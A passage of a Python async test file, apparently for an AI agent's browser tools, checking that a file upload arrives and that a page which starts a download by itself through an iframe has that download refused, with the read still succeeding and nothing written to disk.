    assert result.status is ExecutionStatus.SUCCEEDED, result.error
    assert result.output["gestures"] == 1
    received = a.body("POST /uploads/fileprocessor").replace("\r\n", "\n")
    assert TEXT.decode() in received, "the bytes left when the file was given"
    assert 'filename="da-caricare.txt"' in received
    assert failures == (), "the verifier saw the text within its four seconds"


STARTS_ONE = '<h1>Letto</h1><img src="/held.gif"><iframe src="/attach"></iframe>'


async def test_a_read_says_the_download_its_page_started_by_itself_and_fails_for_nothing(
    browser: Any, served: list[Any], tmp_path: Path
) -> None:
    """Every tool of the browser says it, with the origin alone. The page of this test ends
    loading when the test lets it, after the browser announced the download: the precondition of
    «the step ended after the announcement» is built, not raced for."""
    a, _ = sites(served)
    a.pages[("GET", "/starts")] = (200, HTML, STARTS_ONE)
    a.pages[("GET", "/held.gif")] = (200, bounds.GIF, bounds.PIXEL)
    announced = threading.Event()

    def held(asked: str) -> None:
        if asked == "GET /held.gif":
            announced.wait(bounds.LONG)

    a.before = held
    tool = of(browser, BrowserReadTool, AccountReadTool)(
        browsing(a.origin), browser, CLOCK, FakeIdGenerator(), pages=FakeTaskPages()
    )
    capability = of(browser, BROWSER_READ, BROWSER_READ_AS_YOU)
    arguments = {"site": SITE, "path": "/starts", "selector": "h1", "purpose": "la prova"}

    reading = asyncio.ensure_future(tool.execute(decision(capability), arguments, FakeStop()))
    await until(
        lambda: any(one.door.refused for one in browser._pages.values()), "a download announced"
    )
    announced.set()
    result = await reading

    assert result.status is ExecutionStatus.SUCCEEDED, result.error
    assert result.output["text"] == "Letto" and result.output[DOWNLOAD_REFUSED] == a.origin
    assert [one for one in tmp_path.rglob("*") if one.is_file()] == []


for _name, _test in list(globals().items()):
    if _name.startswith("test_") and asyncio.iscoroutinefunction(_test):
        globals()[_name] = bounds.bounded(_test)
